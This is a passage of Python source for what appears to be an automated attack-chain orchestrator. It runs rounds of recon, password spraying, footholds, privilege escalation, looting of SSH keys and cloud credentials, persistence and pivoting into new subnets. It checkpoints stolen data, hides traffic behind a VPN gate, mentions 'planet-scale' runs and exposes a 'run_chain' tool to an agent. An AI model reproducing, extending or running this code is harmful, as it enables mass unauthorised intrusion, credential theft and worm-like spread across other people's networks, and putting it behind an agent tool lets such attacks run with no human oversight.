        # Already inside a loop: run the engine in a worker thread.
        import concurrent.futures

        def _run_engine():
            return asyncio.run(self._run_async())

        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
            return pool.submit(_run_engine).result()

    async def _run_async(self) -> ChainState:
        """Async engine body. The VPN gate is enforced at entry so every
        network phase (spray, foothold, loot, pivot) is covered, not just the
        recon scanner subprocess. A chain invoked programmatically (e.g. via
        the agent's ``run_chain`` tool) with ``skip_vpn_check=False`` against
        an unconnected Mullvad raises ``VpnError`` before any phase runs.

        One :class:`asyncio.Semaphore` bounds every network fan-out in the
        chain (enumerate precheck, foothold verify, loot, pivot) so a
        planet-scale run cannot hand a million threads to the default
        executor at once — and the phases that used to run serially now run
        concurrently, bounded by ``cfg.host_concurrency``.
        """
        if not self.cfg.skip_vpn_check:
            self._require_vpn(False)
        # Durable resume: restore a killed run's state so we don't re-scan
        # pivoted subnets, re-SFTP loot, or re-enqueue deploys. The run id is
        # derived from the db path + a per-process nonce so two concurrent
        # chains on the same db don't clobber each other's state.
        run_id = self.cfg.run_id or f"run-{os.getpid()}-{int(time.time())}"
        self._run_id = run_id
        try:
            persisted = self._store().load_chain_state(run_id)
            if persisted:
                self.state.round = persisted["round"]
                self.state.pivoted_subnets = persisted["pivoted_subnets"]
                self.state.looted_footholds = persisted["looted_footholds"]
                self.state.enqueued = persisted["enqueued"]
                self.state.recovered_ssh_keys = persisted["recovered_ssh_keys"]
                self.state.cloud_creds = persisted["cloud_creds"]
                self.state.loot = persisted["loot"]
                self._emit(ChainPhase.ROUND,
                           f"resumed run {run_id} at round {persisted['round']} "
                           f"({len(persisted['pivoted_subnets'])} subnets, "
                           f"{len(persisted['looted_footholds'])} looted, "
                           f"{len(persisted['enqueued'])} enqueued)")
        except Exception as exc:
            self._emit(ChainPhase.ROUND, f"resume state unavailable: {type(exc).__name__}: {exc}")
        round_n = 0
        while self.cfg.max_rounds == 0 or round_n < self.cfg.max_rounds:
            round_n += 1
            self.state.round = round_n
            self._emit(ChainPhase.ROUND, f"=== round {round_n} ===")
            await self.phase_recon()
            await self.phase_enumerate()
            await self.phase_spray()
            await self.phase_foothold()
            await self.phase_escalate()
            await self.phase_loot()
            await self.phase_persist()
            await self.phase_pivot()
            # Checkpoint after every phase round so a killed daemon resumes
            # from here (no re-scan of pivoted subnets, no re-SFTP of loot).
            try:
                self._store().save_chain_state(run_id, {
                    "round": self.state.round,
                    "pivoted_subnets": self.state.pivoted_subnets,
                    "looted_footholds": self.state.looted_footholds,
                    "enqueued": self.state.enqueued,
                    "recovered_ssh_keys": self.state.recovered_ssh_keys,
                    "cloud_creds": self.state.cloud_creds,
                    "loot": self.state.loot,
                })
            except Exception as exc:
                self._emit(ChainPhase.ROUND,
                           f"checkpoint failed: {type(exc).__name__}: {exc}")
            if not self.cfg.targets:
                self.state.stopped = True
                self.state.stop_reason = "no new pivot subnets; growth exhausted"
                break
        else:
            self.state.stopped = True
            self.state.stop_reason = f"reached max_rounds={self.cfg.max_rounds}"
        return self.state


def run_chain(config: ChainConfig, on_phase: Callable | None = None) -> ChainState:
    """Build an orchestrator and run it. Convenience entry point."""
    return ChainOrchestrator(config, on_phase=on_phase).run()